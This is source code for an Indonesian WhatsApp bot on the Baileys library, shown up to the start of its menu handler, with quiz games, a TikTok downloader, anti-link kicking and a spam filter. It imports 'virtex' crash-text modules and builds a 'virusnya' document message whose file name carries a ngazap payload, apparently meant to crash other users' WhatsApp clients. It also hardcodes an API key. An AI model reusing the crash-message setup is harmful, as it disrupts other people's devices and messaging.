

"use strict";
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { bioskop, bioskopNow, latinToAksara, aksaraToLatin, gempa, gempaNow, jadwalTV, listJadwalTV, jadwalsholat} = require ('@bochilteam/scraper') 
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./lib/console.js')
const { pinterest, wallpaper, wikimedia, quotesAnime, komiku, ssweb, sholat, tafsirsurah, fbdl } = require("./lib/search");
const { isUrl, getRandom, getGroupAdmins, runtime, sleep, reSize, makeid, fetchJson, getBuffer } = require("./lib/myfunc");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/addlist');
const { jadibot, listJadibot } = require('./lib/jadibot')
const { rulesBot, infoOwner } = require('./help')

// database virtex
const { philips } = require('./lib/virtex/philips')
const { virus } = require('./lib/virtex/virus')
const { ngazap } = require('./lib/virtex/ngazap')

// apinya
const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const yogipw = require("tod-api");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone")
const similarity = require('similarity');
const threshold = 0.72

// Response
const msgFilter = require("./lib/spam");
const { stalkff } = require("./lib/stalker/stalk-ff");
const { stalkml } = require("./lib/stalker/stalk-ml");
const { npmstalk } = require("./lib/stalker/stalk-npm");
const { githubstalk } = require("./lib/stalker/stalk-gh");
const { TelegraPh } = require('./lib/Upload_Url');
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon()

const Exif = require("./lib/WmSticker")
const exif = new Exif()

let orang_spam = []

// Database
const setting = JSON.parse(fs.readFileSync('./config.json'));
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
const welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
const mess = JSON.parse(fs.readFileSync('./database/mess.json'));
const db_error = JSON.parse(fs.readFileSync('./database/error.json'));
const db_user = JSON.parse(fs.readFileSync('./database/pengguna.json'));
const db_menfes = JSON.parse(fs.readFileSync('./database/menfess.json'));
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
const DB_Tiktok = JSON.parse(fs.readFileSync('./database/tiktokAuto.json'));

//Database Game
const tebakkata = JSON.parse(fs.readFileSync("./database/game/tebakkata.json"));
const asahotak = JSON.parse(fs.readFileSync("./database/game/asahotak.json"));
const caklontong = JSON.parse(fs.readFileSync("./database/game/caklontong.json"));
const tebakgambar = JSON.parse(fs.readFileSync("./database/game/tebakgambar.json"));
const tebakbendera = JSON.parse(fs.readFileSync("./database/game/tebakbendera.json"));
const tebakkalimat = JSON.parse(fs.readFileSync("./database/game/tebakkalimat.json"));
const siapakahaku = JSON.parse(fs.readFileSync("./database/game/siapakahaku.json"));
const tebakkimia = JSON.parse(fs.readFileSync("./database/game/tebakkimia.json"));
const tebaklirik = JSON.parse(fs.readFileSync("./database/game/tebaklirik.json"));
const tebaktebakan = JSON.parse(fs.readFileSync("./database/game/tebaktebakan.json"));
const susunkata = JSON.parse(fs.readFileSync("./database/game/susunkata.json"));
const tekateki = JSON.parse(fs.readFileSync("./database/game/tekateki.json"));

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async(conn, msg, m, setting, store) => {
try {
let { ownerNumber, botName, apiZeeone } = setting
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = [`${setting.ownerNumber}`,"6285791220179@s.whatsapp.net","6285806240904@s.whatsapp.net"].includes(sender) ? true : false
const pushname = msg.pushName
const budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
const body = chats.startsWith(prefix) ? chats : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'

// Group
const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)
const isAntiLink = antilink.includes(from) ? true : false
const isWelcome = isGroup ? welcome.includes(from) : false
const isAutoDownloadTT = DB_Tiktok.includes(from) ? true : false
 
// Quoted
const quoted = msg.quoted ? msg.quoted : msg
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList

const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot Created By ${setting.ownerName}\n`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;VelzzyBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./media/thumbnail.jpg')}}}
const fbc = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `---[ BROADCAST ]---\n`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;VelzzyBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./media/thumbnail.jpg')}}}

const isUrl = (url) => {
			return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = conn.sendMessage(from, { text: teks, mentions: mems })
return res
} else {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

// auto read
conn.readMessages([msg.key])

const reply = (teks) => {conn.sendMessage(from, { text: teks }, { quoted: msg })}

const virusnya = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `GuraBot-MD ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const q1 = q.split('&')[0];
const q2 = q.split('&')[1];
const q3 = q.split('&')[2];	
const q4 = q.split('|')[0];
const q5 = q.split('|')[1];
const q6 = q.split('|')[2];	


// AUTO DOWNLOAD TIKTOK
if (isGroup && isAutoDownloadTT) {
if (chats.match(/(tiktok.com)/gi)){
reply('Url tiktok terdekteksi\nSedang mengecek data url.')
await sleep(3000)
var tt_res = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=SadTeams&url=${chats}`)
if (tt_res.status == 404) return reply('Gagal url tidak ditemukan')
var lagu_tt = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=SadTeams&url=${chats}`)
reply(`𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗

< *Title:* ${tt_res.result.title}
< *Durasi:* ${tt_res.result.duration}
< *Username:* ${tt_res.result.author.username}
< *Nickname:* ${tt_res.result.author.nickname}
< *Source:* ${chats}

Video & Audio sedang dikirim...`)
conn.sendMessage(sender,{video:{url:tt_res.result.link}, caption:'No Watermark!'}, {quotes:msg})
conn.sendMessage(sender,{audio:lagu_tt, mimetype:'audio/mpeg', fileName:'tiktokMusic.mp3'}, {quotes:msg})
if (isGroup) return conn.sendMessage(from, {text:'Media sudah dikirim lewat chat pribadi bot.'}, {quoted:msg})
}
}

// Response Addlist
if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
var get_data_respon = getDataResponList(from, chats, db_respon_list)
if (get_data_respon.isImage === false) {
conn.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, {
quoted: msg
})
} else {
conn.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: msg
})
}
}

//Function Game
const cekGame = (satu, dua, tiga) => { 
let x1 = false
Object.keys(tiga).forEach((i) => {
if (tiga[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return tiga[x1].id }
if (satu == "jawaban"){ return tiga[x1].jawaban }
if (satu == "deskripsi"){ return tiga[x1].deskripsi }
}
if (x1 == false) { return null } 
}

if (msg.message && cekGame("id", sender, tebakkata) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, tebakkata).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '.tebakkata', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Tebakkata` }, { quoted: msg })
let delTebakK = {id: sender, jawaban: cekGame("jawaban", sender, tebakkata)}
tebakkata.splice(delTebakK, 1)
fs.writeFileSync('./database/game/tebakkata.json', JSON.stringify(tebakkata, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, tebakkata) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, tebakkata) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, asahotak) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, asahotak).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Asah Otak 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '#asahotak', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Asah Otak` }, { quoted: msg })
let delAsahO = {id: sender, jawaban: cekGame("jawaban", sender, asahotak)}
asahotak.splice(delAsahO, 1)
fs.writeFileSync('./database/game/asahotak.json', JSON.stringify(asahotak, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, asahotak) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, asahotak) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, caklontong) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, caklontong).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '#caklontong', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Cak lontong` }, { quoted: msg })
let delCakL = {id: sender, jawaban: cekGame("jawaban", sender, caklontong), deskripsi: cekGame("deskripsi", sender, caklontong)}
caklontong.splice(delCakL, 1)
fs.writeFileSync('./database/game/caklontong.json', JSON.stringify(caklontong, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, caklontong) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, caklontong) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, tebakgambar) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, tebakgambar).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '#tebakgambar', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Tebak Gambar` }, { quoted: msg })
let delTebakG = {id: sender, jawaban: cekGame("jawaban", sender, tebakgambar)}
tebakgambar.splice(delTebakG, 1)
fs.writeFileSync('./database/game/tebakgambar.json', JSON.stringify(tebakgambar, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, tebakgambar) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, tebakgambar) !== null) return reply("❌ Jawaban Salah")
}


if (msg.message && cekGame("id", sender, tebakbendera) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, tebakbendera).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '.tebakbendera', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Tebak bendera` }, { quoted: msg })
let delTebakB = {id: sender, jawaban: cekGame("jawaban", sender, tebakbendera)}
tebakbendera.splice(delTebakB, 1)
fs.writeFileSync('./database/game/tebakbendera.json', JSON.stringify(tebakbendera, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, tebakbendera) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, tebakbendera) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, tebakkalimat) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, tebakkalimat).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '.tebakkalimat', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Tebak Kalimat` }, { quoted: msg })
let delTebakK = {id: sender, jawaban: cekGame("jawaban", sender, tebakkalimat)}
tebakkalimat.splice(delTebakK, 1)
fs.writeFileSync('./database/game/tebakkalimat.json', JSON.stringify(tebakkalimat, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, tebakkalimat) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, tebakkalimat) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, siapakahaku) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, siapakahaku).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '.siapakahaku', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Siapakah Aku` }, { quoted: msg })
let delSiapaKah = {id: sender, jawaban: cekGame("jawaban", sender, siapakahaku)}
siapakahaku.splice(delSiapaKah, 1)
fs.writeFileSync('./database/game/siapakahaku.json', JSON.stringify(siapakahaku, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, siapakahaku) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, siapakahaku) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, tebakkimia) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, tebakkimia).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '.tebakkimia', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Tebak Kimia`}, { quoted: msg })
let delTebakK = {id: sender, jawaban: cekGame("jawaban", sender, tebakkimia)}
tebakkimia.splice(delTebakK, 1)
fs.writeFileSync('./database/game/tebakkimia.json', JSON.stringify(tebakkimia, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, tebakkimia) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, tebakkimia) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, tebaklirik) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, tebaklirik).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '.tebaklirik', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Tebak lirik` }, { quoted: msg })
let delTebakL = {id: sender, jawaban: cekGame("jawaban", sender, tebaklirik)}
tebaklirik.splice(delTebakL, 1)
fs.writeFileSync('./database/game/tebaklirik.json', JSON.stringify(tebaklirik, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, tebaklirik) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, tebaklirik) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, tebaktebakan) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, tebaktebakan).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '.tebaktebakan', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Tebak Tebakan` }, { quoted: msg })
let delTebakT = {id: sender, jawaban: cekGame("jawaban", sender, tebaktebakan)}
tebaktebakan.splice(delTebakT, 1)
fs.writeFileSync('./database/game/tebaktebakan.json', JSON.stringify(tebaktebakan, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, tebaktebakan) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, tebaktebakan) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, susunkata) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, susunkata).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Susun Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '.susunkata', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Susun Kata` }, { quoted: msg })
let delSusunK = {id: sender, jawaban: cekGame("jawaban", sender, susunkata)}
susunkata.splice(delSusunK, 1)
fs.writeFileSync('./database/game/susunkata.json', JSON.stringify(susunkata, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, susunkata) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, susunkata) !== null) return reply("❌ Jawaban Salah")
}

if (msg.message && cekGame("id", sender, tekateki) !== null && !isCmd) {
let jwbny = budy.toLowerCase()
let jwbn = cekGame("jawaban", sender, tekateki).toLowerCase()
if ((budy) && [jwbn].includes(jwbny)) {
conn.sendMessage(from, { text: "🎮 Teka Teki 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Klik button di bawah", buttons: [{ buttonId: '.tekateki', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Teka Teki` }, { quoted: msg })
let delTekaT = {id: sender, jawaban: cekGame("jawaban", sender, tekateki)}
tekateki.splice(delTekaT, 1)
fs.writeFileSync('./database/game/tekateki.json', JSON.stringify(tekateki, null, 2))
} else if (similarity(jwbny, jwbn) >= threshold && cekGame("id", sender, tekateki) !== null) {
reply('*Dikit lagi!*')
} else if (cekGame("id", sender, tekateki) !== null) return reply("❌ Jawaban Salah")
}


// FUNCTION ANTILINK
if (isGroup && isAntiLink && isBotGroupAdmins){
if (chats.match(/(https:\/\/chat.whatsapp.com)/gi)) {
if (!isBotGroupAdmins) return reply('Untung bot bukan admin')
if (isOwner) return reply('Untung lu owner ku:v😙')
if (isGroupAdmins) return reply('Admin grup mah bebas ygy🤭')
if (fromMe) return reply('bot bebas Share link')
await conn.sendMessage(from, { delete: msg.key })
reply(`*「 GROUP LINK DETECTOR 」*\n\nTerdeteksi mengirim link group,Maaf sepertinya kamu akan di kick`)
conn.groupParticipantsUpdate(from, [sender], "remove")
}
}

const sendContact = (jid, numbers, name, quoted, mn) => {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return conn.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}

let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
}})
}

async function downloadAndSaveMediaMessage (type_file, path_file) {
if (type_file === 'image') {
var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]) }
fs.writeFileSync(path_file, buffer)
return path_file } 
else if (type_file === 'video') {
var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'sticker') {
var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'audio') {
var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file}
}

const cekPesan = (satu, dua) => { 
let x2 = false
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){x2 = i}})
if (x2 !== false) {
if (satu == "id"){ return db_menfes[x2].id }
if (satu == "teman"){ return db_menfes[x2].teman }
}
if (x2 == false) { return null } 
}

const setRoom = (satu, dua, tiga) => { 
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){
if (satu == "±id"){ db_menfes[i].id = tiga
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
if (satu == "±teman"){ db_menfes[i].teman = tiga 
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
}})
}

// Function for Anti Spam
msgFilter.ResetSpam(orang_spam)

const spampm = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
msgFilter.addSpam(sender, orang_spam)
reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik')
}

const spamgr = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
msgFilter.addSpam(sender, orang_spam)
reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik')
}

if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm()
if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr()
if (isCmd && args.length < 1 && !isOwner) msgFilter.addFilter(sender)

//Auto Block Nomor Luar Negeri
if (sender.startsWith('212')) {
return conn.updateBlockStatus(sender, 'block')
}

// Console
if (isGroup && isCmd) {
console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!isGroup && isCmd) {
console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}

// Casenya
switch(command) {
case 'allmenu':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`${setting.botName} © 2023`
reply('```Loading..⌛\nTampilan menu sedang diProses dalam 3detik🍁```')
let menu_nya = `───「 *ALL MENU* 」────

 *${ucapanWaktu} ${cekUser("name", sender)} 👋🏻*

   𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢
    • ID : @${sender.split('@')[0]}
    • Nama : ${cekUser("name", sender)}
    • Premium : (${cekUser("premium", sender)? '✓':'✘'})

   𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
    • BotName : ${setting.botName}
